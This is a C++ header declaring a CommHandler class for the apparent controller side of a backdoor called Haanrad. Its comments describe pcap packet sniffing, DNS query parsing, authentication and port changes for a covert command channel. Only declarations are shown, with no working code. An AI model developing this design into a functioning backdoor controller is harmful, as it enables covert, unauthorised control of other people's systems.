//
// Created by bensoer on 31/10/16.
//

#ifndef HAANRAD_COMMHANDLER_H
#define HAANRAD_COMMHANDLER_H

//CommHandler will handle all work with sending and receiving data between it and the backdoor
//CommHandler is meant to be continually running and thus checking for new packets

//Any new data collected is then Passed to the main thread via the MessageQueue - Maybe should spawn another thread to do that ? Then we can keep listening sooner

//CommHandler will also be dealing with trade ups and changes in listening ports that may occur during a communication session

#include <string>
#include <zconf.h>
#include "MessageQueue.h"
#include "../haanrad/PacketMeta.h"
#include "../shared/HCrypto.h"
#include <pcap.h>

using namespace std;

class CommHandler {

private:

    pcap_if_t * allInterfaces = nullptr;
    pcap_if_t * listeningInterface = nullptr;
    pcap_t * currentFD;

    bool haanradConnected = false;
    string password = "";


    CommHandler(MessageQueue * messageQueue, HCrypto * crypto);
    static CommHandler * instance;

    MessageQueue * messageQueue = nullptr;
    HCrypto * crypto = nullptr;

    static void packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet);

    bool getInterface();
    void killListening();
    string parseOutDNSQuery(PacketMeta meta);

    bool isValidAuth(PacketMeta meta);

public:

    static CommHandler * getInstance(MessageQueue * messageQueue, HCrypto * crypto);

    void listenForMessages();

    long processMessagesToSend();

};


#endif //HAANRAD_COMMHANDLER_H
